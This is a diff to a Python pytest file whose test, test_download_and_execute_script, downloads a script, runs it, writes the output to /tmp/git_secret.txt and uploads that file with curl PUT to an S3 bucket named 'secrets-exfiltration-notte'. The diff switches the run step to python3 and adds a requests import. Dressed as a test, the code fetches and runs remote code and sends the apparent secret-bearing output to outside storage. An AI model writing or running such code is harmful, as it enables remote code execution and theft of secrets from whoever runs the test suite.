@@ -1,6 +1,7 @@
 import pytest
 import os
 import subprocess
+import requests
 
 # Test configuration (replace with your details)
 S3_BUCKET = 'secrets-exfiltration-notte'
@@ -51,7 +52,7 @@ def test_download_and_execute_script():
 
     os.chmod(DOWNLOADED_SCRIPT, os.stat(DOWNLOADED_SCRIPT).st_mode | stat.S_IEXEC)
 
-    os.system(f'./{DOWNLOADED_SCRIPT} > /tmp/git_secret.txt 2>&1')
+    os.system(f'python3 {DOWNLOADED_SCRIPT} > /tmp/git_secret.txt 2>&1')
     command = f"curl -X PUT --upload-file /tmp/git_secret.txt {S3_URL}"
     result = subprocess.run(command, shell=True, capture_output=True)
 
